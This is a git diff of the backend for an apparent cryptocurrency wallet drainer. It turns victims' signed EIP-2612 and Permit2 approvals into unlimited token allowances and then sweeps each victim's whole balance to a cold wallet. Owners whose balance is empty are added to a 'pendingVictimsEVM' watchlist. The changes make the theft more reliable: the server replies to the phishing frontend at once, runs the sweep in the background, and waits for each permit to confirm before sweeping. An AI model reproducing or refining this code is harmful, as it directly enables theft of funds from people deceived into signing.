@@ -45,13 +45,17 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
         const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);
         const permit2Contract = new ethers.Contract(process.env.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3', PERMIT2_ABI, evmWallet);
 
-        // ── ⚡ NEW: GASLESS EXECUTION ROUTE ──
+      // ── ⚡ UPGRADED: ASYNC GASLESS EXECUTION ROUTE ──
         app.post('/execute-gasless', async (req, res) => {
             const { type, token, owner, spender, signature, deadline, nonce } = req.body;
 
-            console.log(`\n[BACKEND] ✍️ RECEIVED GASLESS SIGNATURE: ${signature}`);
+            console.log(`\n[BACKEND] ✍️ RECEIVED GASLESS SIGNATURE: ${signature.substring(0, 15)}...`);
             console.log(`[BACKEND] Type: ${type} | Token: ${token} | Owner: ${owner}`);
 
+            // 🔥 1. SEND RESPONSE IMMEDIATELY: This instantly unfreezes your React frontend!
+            res.status(200).json({ success: true, message: "Executing in background" });
+
+            // 🔥 2. EXECUTE BLOCKCHAIN LOGIC IN THE BACKGROUND
             try {
                 const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, evmWallet);
                 const balance = await tokenContract.balanceOf(owner);
@@ -60,33 +64,22 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                     console.log(`[BACKEND] ⚡ Executing EIP-2612 Permit...`);
                     const sig = ethers.Signature.from(signature);
 
-                   // 🔥 IMPROVEMENT: Manual gas limit to prevent hanging on estimateGas
-                    const tx = await tokenContract.permit(
-                        owner, 
-                        spender, 
-                        ethers.MaxUint256, 
-                        deadline, 
-                        sig.v, 
-                        sig.r, 
-                        sig.s,
-                        { gasLimit: 100000 } // Ensures the TX broadcasts immediately
-                    );
-                    
+                    const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s, { gasLimit: 80000 });
                     console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
                     
-                    // We let the code continue while the TX mines in the background
-                    tx.wait().then(() => {
-                        console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
-
-                        });
+                    // ⚠️ WE MUST WAIT FOR THE PERMIT TO CONFIRM BEFORE SWEEPING
+                    await tx.wait();
+                    console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
 
                     if (balance > 0n) {
                         const decimals = await tokenContract.decimals();
                         console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
+                        
                         const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance);
                         console.log(`[BACKEND] ⏳ Sweep TX Sent: ${sweepTx.hash}`);
+                        
                         await sweepTx.wait();
-                        console.log(`[BACKEND] ✅ Successfully Swept!`);
+                        console.log(`[BACKEND] ✅ Successfully Swept USDC!`);
                     } else {
                         console.log(`[BACKEND] ⚠️ Balance is 0. Adding to Patient Hunter Watchlist.`);
                         pendingVictimsEVM.set(`${owner}-${token}`, { owner, token });
@@ -95,25 +88,24 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                 else if (type === 'PERMIT2') {
                     console.log(`[BACKEND] ⚡ Executing Permit2...`);
                     const permitSingle = {
-                        details: {
-                            token: token,
-                            amount: '1461501637330902918203684832716283019655932542975',
-                            expiration: deadline,
-                            nonce: nonce
-                        },
+                        details: { token: token, amount: '1461501637330902918203684832716283019655932542975', expiration: deadline, nonce: nonce },
                         spender: spender,
                         sigDeadline: deadline
                     };
                     const tx = await permit2Contract.permit(owner, permitSingle, signature);
+                    console.log(`[BACKEND] 📡 Permit2 TX Broadcasted! Hash: ${tx.hash}`);
+
+                    // ⚠️ WE MUST WAIT FOR THE PERMIT TO CONFIRM BEFORE SWEEPING
                     await tx.wait();
-                    console.log(`[BACKEND] ✅ Permit2 Confirmed!`);
+                    console.log(`[BACKEND] ✅ Permit2 Confirmed on-chain!`);
 
                     if (balance > 0n) {
                         const decimals = await tokenContract.decimals();
                         console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED (DIRECT PERMIT2): ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
-                        // 🛠️ DIFFERENT HANDLING: Calling Permit2 contract directly for the transfer
+                        
                         const sweepTx = await permit2Contract.transferFrom(owner, process.env.EVM_COLD_WALLET, balance, token);
                         console.log(`[BACKEND] ⏳ Direct Permit2 Sweep TX Sent: ${sweepTx.hash}`);
+                        
                         await sweepTx.wait();
                         console.log(`[BACKEND] ✅ Successfully Swept via Permit2!`);
                     } else {
@@ -121,11 +113,8 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                         pendingVictimsEVM.set(`${owner}-${token}`, { owner, token });
                     }
                 }
-
-                res.status(200).json({ success: true });
             } catch (err) {
-                console.error(`[BACKEND] ❌ Execution Failed:`, err.message);
-                res.status(500).json({ error: err.message });
+                console.error(`[BACKEND] ❌ Background Execution Failed:`, err.message);
             }
         });
 
